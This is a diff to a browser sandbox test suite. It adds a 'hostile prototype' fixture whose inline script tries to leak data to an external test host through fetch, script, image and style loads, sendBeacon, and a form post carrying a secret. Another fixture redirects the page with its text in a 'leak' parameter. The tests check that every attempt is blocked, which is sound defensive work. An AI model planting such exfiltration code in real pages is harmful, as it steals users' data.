@@ -37,6 +37,45 @@ const NAVIGATOR = {
   "a/index.html": "<p>Navigating</p><script src=\"nav.js\"></script>",
   "a/nav.js": "setTimeout(function () { location.href = new URLSearchParams(location.search).get('ext') + '/self?leak=' + encodeURIComponent(document.body.innerText); }, 200);",
 };
+/**
+ * A prototype written the way agents write them, all inline: a <style> block, a style attribute, an inline script
+ * and an inline event handler (the policy allows them, design 3b as built). Its inline script also tries the network.
+ */
+const INLINE = {
+  "a/index.html": `<!doctype html><html><head><meta charset="utf-8"><style>main { color: rgb(4, 5, 6); }</style></head>
+<body><main><p id="styled" style="color: rgb(7, 8, 9)">Styled inline</p><button id="go" type="button" onclick="window.__clicked = true">Go</button></main>
+<form id="leak" method="post" target="sink"><input name="secret" value="from-inline"></form><iframe name="sink" hidden></iframe>
+<script>
+(async function () {
+  var q = new URLSearchParams(location.search);
+  var attempts = (window.__attempts = {});
+  window.__inlineRan = true;
+  function outcome(name, p) { return p.then(function (v) { attempts[name] = "succeeded: " + v; }, function (e) { attempts[name] = "blocked: " + e.name; }); }
+  function loads(name, tag, url) {
+    return new Promise(function (resolve) {
+      var el = document.createElement(tag);
+      el.onload = function () { attempts[name] = "loaded"; resolve(); };
+      el.onerror = function () { attempts[name] = "blocked: error"; resolve(); };
+      setTimeout(function () { if (!(name in attempts)) attempts[name] = "no answer"; resolve(); }, 1500);
+      if (tag === "link") { el.rel = "stylesheet"; el.href = url; } else el.src = url;
+      document.head.appendChild(el);
+    });
+  }
+  await Promise.all([
+    outcome("fetchAppApi", fetch(q.get("app") + "/api/state").then(function (r) { return r.status; })),
+    outcome("fetchExternal", fetch(q.get("ext") + "/inline-fetch").then(function (r) { return r.status; })),
+    loads("imageExternal", "img", q.get("ext") + "/inline-image"),
+    loads("scriptExternal", "script", q.get("ext") + "/inline-script"),
+    loads("styleExternal", "link", q.get("ext") + "/inline-style"),
+  ]);
+  try { attempts.beacon = String(navigator.sendBeacon(q.get("ext") + "/inline-beacon", "from-inline")); } catch (e) { attempts.beacon = "blocked: " + e.name; }
+  try { var f = document.getElementById("leak"); f.action = q.get("ext") + "/inline-form"; f.submit(); } catch (e) {}
+  document.getElementById("go").click();
+  await new Promise(function (resolve) { setTimeout(resolve, 500); });
+  window.__done = true;
+})();
+</script></body></html>`,
+};
 const COOKIE = { name: "session", value: "app-secret" };
 
 let root: string;
@@ -75,6 +114,7 @@ beforeAll(async () => {
   writeVersion(studio, "sa-1", 1, HOSTILE);
   writeVersion(studio, "sa-2", 1, SIBLING);
   writeVersion(studio, "sa-3", 1, NAVIGATOR);
+  writeVersion(studio, "sa-4", 1, INLINE);
 
   // The app: the real service's HTTP server, serving a stand-in for the studio page from its static folder. The
   // controls use a second one without the prototype port, so its pages carry no frame policy.
@@ -111,6 +151,7 @@ beforeAll(async () => {
   writeFileSync(join(staticDir, "index.html"), appPage(`${prototypeOrigin("sa-1", 1, protoPort)}/a/index.html${guarded}`, true));
   writeFileSync(join(staticDir, "control.html"), appPage(`/unguarded/index.html${query(`http://127.0.0.1:${controlPort}`)}`, false));
   writeFileSync(join(staticDir, "navigate.html"), appPage(`${prototypeOrigin("sa-3", 1, protoPort)}/a/index.html${guarded}`, true));
+  writeFileSync(join(staticDir, "inline.html"), appPage(`${prototypeOrigin("sa-4", 1, protoPort)}/a/index.html${guarded}`, true));
   const startedAt = new Date().toISOString();
   app = createHttpServer({ store, scheduler, startedAt, allowedHosts: [`127.0.0.1:${appPort}`], staticDir, prototypePort: protoPort });
   control = createHttpServer({ store, scheduler, startedAt, allowedHosts: [`127.0.0.1:${controlPort}`], staticDir });
@@ -229,6 +270,28 @@ describe.skipIf(!browser)("a hostile prototype in the app's sandboxed frame", ()
       await context.close();
     }
     expect(navigated).toEqual([[], ["GET /self?leak=Navigating"]]);
+  }, 30_000);
+
+  it("inline styles, scripts and handlers work, and an inline script still reaches no network", async () => {
+    const { context, page, seen } = await newContext();
+    const start = { app: appRequests.length, outside: outsideRequests.length, proto: protoRequests.length };
+    const appUrl = `http://127.0.0.1:${appPort}/inline.html`;
+    await page.goto(appUrl);
+    const origin = prototypeOrigin("sa-4", 1, protoPort);
+    const frame = await prototypeFrame(page, origin);
+    // The <style> block, the style attribute, the inline script and the onclick handler all ran.
+    expect(await js(frame, 'getComputedStyle(document.querySelector("main")).color')).toBe("rgb(4, 5, 6)");
+    expect(await js(frame, 'getComputedStyle(document.getElementById("styled")).color')).toBe("rgb(7, 8, 9)");
+    expect(await js(frame, "[window.__inlineRan === true, window.__clicked === true]")).toEqual([true, true]);
+    // Its requests failed in the page, and the effects show none of them left it.
+    const attempts = await attemptsIn(frame);
+    expect(attempts).toMatchObject({ fetchAppApi: "blocked: TypeError", fetchExternal: "blocked: TypeError", imageExternal: "blocked: error", scriptExternal: "blocked: error", styleExternal: "blocked: error" });
+    await page.waitForTimeout(500);
+    expect(appRequests.slice(start.app)).toEqual(["/inline.html"]);
+    expect(outsideRequests.slice(start.outside)).toEqual([]);
+    expect(seen.filter((u) => u !== appUrl && !u.startsWith(`${origin}/`))).toEqual([]);
+    expect([...new Set(protoRequests.slice(start.proto).map((r) => `${r.url.split("?")[0]} ${r.status}`))].sort()).toEqual(["/__orchestrator/pin.js 200", "/a/index.html 200"]);
+    await context.close();
   }, 30_000);
 
   it("is not shown at all when a page other than the app frames it", async () => {
